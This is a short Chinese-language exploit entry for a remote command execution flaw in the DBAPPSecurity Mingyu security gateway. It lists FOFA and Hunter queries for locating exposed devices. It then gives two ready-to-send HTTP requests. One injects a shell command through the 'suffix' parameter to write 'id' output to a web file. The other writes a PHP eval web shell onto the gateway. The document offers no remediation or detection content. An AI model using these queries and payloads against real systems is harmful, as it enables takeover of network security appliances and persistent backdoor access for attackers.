# 安恒 明御安全网关 aaa_portal_auth_local_submit 远程命令执行漏洞

## 网络测绘

fofa: app="安恒信息-明御安全网关"

hunter: app.name="安恒明御安全网关"

## POC / EXP

```
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id >/usr/local/webui/test.txt`)}} HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```
/test.txt
```

```
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"<%3fphp+eval(\\$_POST[\\"a\\"]);?>"+>+.xxx.php HTTP/1.1
Host: xxx
Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10 16 0) Applewebkit/537.36 (KHTML likeGecko) Chrome/78.0.3994.108 Safari/537.36
Sec-Fetch-User: ?1
Accept:
text/html,application/xhtml+xml,application/xml;g=0.9,image/webp,image/apng,*/*;g=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip， deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

```
/webui/.xxx.php
```